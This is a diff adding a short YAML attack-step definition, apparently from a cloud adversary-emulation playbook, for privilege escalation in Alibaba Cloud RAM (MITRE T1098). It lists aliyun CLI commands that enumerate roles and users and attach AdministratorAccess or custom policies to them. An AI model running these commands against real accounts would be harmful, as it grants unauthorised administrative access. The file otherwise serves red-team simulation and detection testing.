@@ -1,0 +1,13 @@
+name: Privilege Escalation via RAM Role Policy Manipulation
+description: Escalates privileges by attaching high-privilege policy to a custom RAM role.
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+  - action: aliyun ram ListRoles
+    description: Enumerate existing RAM roles
+  - action: aliyun ram AttachPolicyToRole --PolicyType System --PolicyName AdministratorAccess --RoleName <role-name>
+    description: Attach AdministratorAccess policy to selected role
+  - action: aliyun ram ListUsers
+    description: Enumerate RAM users
+  - action: aliyun ram AttachPolicyToUser --PolicyType Custom --PolicyName <custom-policy> --UserName <target-user>
+    description: Attach the new policy to a user
